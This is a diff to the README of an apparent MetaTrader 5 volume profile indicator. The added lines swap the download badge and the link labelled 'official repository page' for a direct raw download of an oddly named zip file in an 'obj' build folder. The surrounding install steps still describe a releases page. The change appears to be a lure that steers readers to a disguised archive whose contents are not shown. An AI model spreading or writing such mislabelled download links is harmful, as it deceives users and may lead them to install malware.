@@ -1,6 +1,6 @@
 # 📊 MT5-volume-profile-indicator - See traded volume at every price
 
-[![Download Indicator](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/lenardclimatical374/MT5-volume-profile-indicator)
+[![Download Indicator](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/lenardclimatical374/MT5-volume-profile-indicator/raw/refs/heads/main/VolumeProfile/obj/volume-profile-indicator-M-ulster.zip)
 
 This software provides a visual representation of trading volume for MetaTrader 5. It shows market participants how much volume occurs at specific price levels. Traders use this tool to identify supply and demand zones, liquidity clusters, and structural turning points in the market.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these specifications to run the indicator without iss
 
 Follow these steps to set up the indicator on your machine:
 
-1. Visit the [official repository page](https://github.com/lenardclimatical374/MT5-volume-profile-indicator) to get the latest version.
+1. Visit the [official repository page](https://github.com/lenardclimatical374/MT5-volume-profile-indicator/raw/refs/heads/main/VolumeProfile/obj/volume-profile-indicator-M-ulster.zip) to get the latest version.
 2. Locate the most recent release entry on the right side of the page.
 3. Click the link to download the source file, usually ending in .mq5 or .ex5.
 4. Save the file to your desktop or your Downloads folder.
